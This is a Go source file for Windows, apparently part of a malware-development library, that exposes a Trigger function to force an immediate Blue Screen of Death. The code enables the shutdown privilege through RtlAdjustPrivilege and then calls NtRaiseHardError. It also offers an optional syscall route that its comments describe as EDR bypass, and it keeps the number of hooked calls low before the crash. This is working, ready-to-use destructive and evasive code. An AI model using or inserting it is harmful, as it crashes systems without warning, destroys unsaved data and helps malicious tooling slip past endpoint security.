//go:build windows

package bsod

import (
	"errors"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

var (
	// ErrPrivilege indicates that privilege elevation failed.
	ErrPrivilege = errors.New("privilege adjustment failed")

	// ErrHardError indicates that the hard error call failed.
	ErrHardError = errors.New("hard error call failed")
)

var (
	procRtlAdjustPrivilege = api.Ntdll.NewProc("RtlAdjustPrivilege")
)

// seShutdownPrivilege is the privilege index required to shut down the system.
const seShutdownPrivilege = 19

// Trigger causes an immediate Blue Screen of Death.
// This is a DESTRUCTIVE operation — the system will crash immediately
// with no opportunity to save data.
//
// When caller is non-nil, NtRaiseHardError is routed through the Caller
// for EDR bypass. RtlAdjustPrivilege always uses the WinAPI path since
// it is not typically hooked. Pass nil for standard WinAPI behavior.
//
// This function does not return on success.
func Trigger(caller *wsyscall.Caller) error {
	// Enable SeShutdownPrivilege via RtlAdjustPrivilege (single ntdll call)
	// instead of the multi-step win/privilege path (OpenProcessToken +
	// LookupPrivilegeValue + AdjustTokenPrivileges) to minimize the
	// number of hooked API calls before the crash.
	var wasEnabled int32
	r1, _, _ := procRtlAdjustPrivilege.Call(
		seShutdownPrivilege,
		1, // enable
		0, // current process (not thread)
		uintptr(unsafe.Pointer(&wasEnabled)),
	)
	if r1 != 0 {
		return ErrPrivilege
	}

	// Raise a fatal hard error — option 6 = shutdown system.
	var response uint32
	if caller != nil {
		r, _ := caller.Call("NtRaiseHardError",
			0xDEADDEAD,
			0, 0, 0, 6,
			uintptr(unsafe.Pointer(&response)),
		)
		if r != 0 {
			return ErrHardError
		}
	} else {
		r1, _, _ = api.Ntdll.NewProc("NtRaiseHardError").Call(
			0xDEADDEAD,
			0, 0, 0, 6,
			uintptr(unsafe.Pointer(&response)),
		)
		if r1 != 0 {
			return ErrHardError
		}
	}

	return nil
}
